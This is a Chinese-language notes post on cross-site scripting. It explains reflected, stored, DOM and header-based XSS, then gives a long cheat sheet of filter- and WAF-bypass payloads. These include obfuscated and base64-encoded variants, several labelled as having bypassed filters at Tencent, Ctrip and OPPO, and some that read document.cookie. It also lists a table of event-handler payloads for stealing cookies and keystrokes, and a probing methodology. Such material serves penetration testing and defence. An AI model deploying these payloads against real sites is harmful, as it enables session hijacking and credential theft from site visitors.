---
title: XSS
date: 2026-06-09
categories:
  - 核心漏洞
tags: []
---

## XSS（跨站脚本攻击）

### 原理：

原理为攻击者可以往网页中插入一些恶意的代码。然后浏览者浏览的时候就会被攻击，从而达到攻击的目的

### 类型：

#### 反射型：

通过get，post方式来传给服务端，一次性攻击，一般刷新即可解决

#### 存储型：

攻击代码直接存储在服务器中，攻击持久

#### DOM型：

js代码操作dom文档对象模型的时候产生的漏洞，一般不与服务端交互

#### 头部注入：

是因为服务端将数据包的几个头部直接输出到了前端上面，于是可以直接注入请求头来达成注入目的

- Referer

- User-Agent

- X-Forwarded-For

- 自定义的头

## 可注入事件

html注释：<!-- -->

js注释：// /**/

可注入事件：

```html
<script>alert(1)</script>

<img src=1 omerror=alert(1)>

<input onfocus="alert(1)">
<input onfocus="alert(1)" autofocus>
<input onblur=alert(1) autofocus><input autofocus><!--竞争触发，两个都是autofocus，会直接触发onblur事件-->

<details open ontoggle="alert(1)">

<svg onload=alert(1)>

<select onfocus=alert(1) autofocus>

<iframe onload=alert(1)></iframe>

<video><source onerror="alert(1)">
  
<body
onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus> 
```

## 键鼠特性块

|**事件类型**|**事件名称**|**触发条件**|**利用方式**|**典型 Payload 示例**|**防御建议**|
|-|-|-|-|-|-|
|**鼠标**|`onclick`|点击元素|伪装链接 / 按钮诱导点击|`<a onclick="stealCookie()">登录</a>`|过滤 HTML 标签属性|
|**鼠标**|`onmouseover`|鼠标悬停|全屏 DIV 或图片覆盖页面|`<div onmouseover="steal()">悬停此处</div>`|CSP 禁止内联脚本|
|**鼠标**|`oncontextmenu`|右键点击|伪装右键菜单窃取信息|`<img oncontextmenu="steal()">`|转义用户输入的引号|
|**键盘**|`onkeydown`|按下任意键|监听组合键（如 Ctrl+C）|`<input onkeydown="logKey(event)">`|严格验证输入内容|
|**键盘**|`onkeyup`|松开任意键|实时窃取输入内容（如密码）|`<textarea onkeyup="send(this.value)"></textarea>`|使用 HttpOnly Cookie|

## 绕过

### 不常用标签绕过：

### 大小写绕过：

后台源码只对小写的关键字做了过滤，未对大小写的做正则匹配，但是浏览器输出的时候都是使用的小写，所以说可以使用大小写绕过

### 双写绕过：

在输入关键词之后发现关键词没有了，就多半是因为后台的源码进行了替换为空的操作，于是可以直接写在一个关键词中间重写一遍，这样替换为空之后，代码还是会起作用

### 编码绕过：

如果后台启用了比较全的黑名单，而且之前的所有的绕过方式都不能起作用，我们可以直接使用一下编码绕过，可以使用以下几种编码：

- html实体编码

- base64编码

- url编码

### 字符串拼接：

```html
<img src="x" onerror="a=`aler`;b=`t`;c=`('xss')`;eval(a+b+c)">

<script>top["al"+"ert"](1);</script>
```

### 禁用alert

```html
<!-- 使用一些不常用的语句 -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>console.log(1)</script>
```

### 禁用单引号

使用反引号，数字可以不用带单引号

```html
<!--用反引号，/代替 -->
<script>confirm(`xxpuppy`)</script>
<script>alert(1)</script>
```

### 空格的替换：

空格的url编码为:%20

可以替换为:

%09   %0a   %0b    %0c     %0d    %a0     /

### 混淆绕过：

```html
</tExtArEa>'"<a/href="ja%26Tab;vas%26Tab;cript%26Tab;%26Tab;%26Tab;:%26Tab;%26Tab;top%26Tab;[8680439..toString(30)]()">click_me</a>#

<div class=\"media-wrap image-wrap\"><img src=\"https://img.threatbook.cn/c375eed802260503b4cee1086ea65f0e172480015227cf81a82d77.png\" onerror=\"alert`1`\"/></div>

<script%20type="text/javascript">%20var%20reg%20=%20/test/;%20var%20str%20=%20%27testString%27;%20var%20result%20=%20reg.exec(str);%20alert(result);%20</script>

```

###  编码绕过：

```html
<iframe src="data:text/html;base64,PFNDcmlwdD5hbGVydCgxKTwvU0NyaXB0Pg=="></iframe>

  <iframe src="data:text/html;base64,PG9iamVjdCBkYXRhPWRhdGE6dGV4dC9odG1sO2Jhc2U2NCxQSE5qY21sd2RENWhiR1Z5ZENnbmVITnpKeWs4TDNOamNtbHdkRDQ9Pjwvb2JqZWN0Pg=="></iframe>
#bypass腾讯

<iframe src="data:text/html;base64,PG9iamVjdCBkYXRhPWRhdGE6dGV4dC9odG1sO2Jhc2U2NCxQR0YxWkdsdklITnlZejB4SUc5dVpYSnliM0k5WTI5dVptbHliU2duZUhOemMzTW5LVDQ9Pjwvb2JqZWN0Pg=="></iframe>

```

### 冷门标签绕过：

```html
"\"><s>12356789@qq.com      邮箱xss(验证)
<sTylE OnLoAd=alert(1)>
<dETAILS%0Aopen%0AonToGgle%0A=%0Aa=prompt,a()%20x>
<dETAILS%0Aopen%0AonToGgle%0A=%0Aa=confirm,a()%20x>   #过携程和oppo
22onmouseover=%22a=confirm,a(document.cookie)%22--+//%23    #过oppo
<dETAILS%0Aopen%0AonToGgle%0A=%0Aa=confirm,a(document.cookie)%20x>
<svg%20onmouseover%0A=%0Aa=confirm,a(1)>
<svg%0Aonmouseover%0A=%0Aa=confirm,a(1)%20x>
<svg%20onmouseover%0A=%0Aa=confirm,a(document.cookie)>
'+onclick=a=alert,a(1)%2F%2F
'+onclick=a=alert,a(1)--+
'+onclick=a=confirm,a(1)--+
'+onclick=a=confirm,a(1)%2F%2F
%27+onclick='a=alert,a(1)'--+
在对xss标签进行注释的时候要使用--+和// ，经测试%23无效。如果onload不能用就换成其他属性。
<marquee behavior="alternate" onstart=alert(1)>123</marquee> 
<MaRQuEe BehAvIor="alternate" onStArt=alert(1)>123</MaRQuEe>
<body onpageshow=alert(1)>
<body onPAgeShoW=confirm(111)>
<details ontoggle=alert()>     向下按钮xss
<SVg </onLoaD ="1> (_=prompt,_(1)) "">
<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));</script>
<d3"<"/onclick="1>[confirm``]"<">dianwo        需要点击
<w="/x="y>"/oNCliCk=`<`[confir\u006d``]>dianwo     需要点击
<w="/x="y>"/ondblclick=`<`[confir\u006d``]>dianwo2        需要双击
<w="/x="y>"/oNDblCliCk=`<`[confir\u006d``]>dianwo2        需要双击
<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
<img/src/onerror=\u0061\u006c\u0065\u0072\u0074(1)>
<object data=javascript:alert(1)>
<svg onload=setInterval`alert\x28document.domain\x29`>    
<img src=1 onerror=javascript:{{constructor.constructor('alert(1)')()}}>    点击一次
<a href=javascript:{{constructor.constructor('alert(1)')()}}>dianwo</a>     点击一次
<a href=javascript:<x ng-app>{{constructor.constructor('alert(1)')()}}>dianwo</a>    点击一次
<a href=javascript:{{constructor.constructor('alert(1)')()}}>dianwo</a>   点击一次
<d3"<"/onclick="1>[confirm``]"<">dianwo       点击一次
<d3"<"/oNDblCliCk="1>[confirm``]"<">dianwo    需要双击
<%00EEEE<svg /\/\//ONLoad='a\u006c\u0065\u0072\u0074(1)'/\/\/\>svg>
<svg><set end=1 onend=[1].find(alert)>
<body onpageshow="alert(1)">
<details open ontoggle=alert(1)>    #这个可能不弹窗，但是可以造成xss
<details open ontoggle=\u0061\u006c\u0065\u0072\u0074(1)>
<details%20ontoggle=confirm()>//    #弹窗！

```





## 测试思路：

首先要进行一下无害的标签探测，比如<h1>那些无害的标签，

```html
<!-- 通过<h1><s><p>标签探测，看看是否可以被解析，如果可以被解析就可以进行下一步，当然这个闭合得自己去看源码，下面整理了一些常用的测试语句 -->
</tExtArea><h1>123</h1>#
</tEXtarEa><s>123#//--+
'"></textArEA><s>123#//--+
```

然后进行一些简单的绕过，比如双写，大小写，属性名，闭合等等，有一些标签无法执行脚本，需要先闭合

```html
<title>xxxx</title>
<textarea>xxxx</textarea>
<xmp>xxxx</xmp>
<iframe>xxxx</iframe>
```

触发了waf，就直接把收集到的进去插，实在不行才自己构造



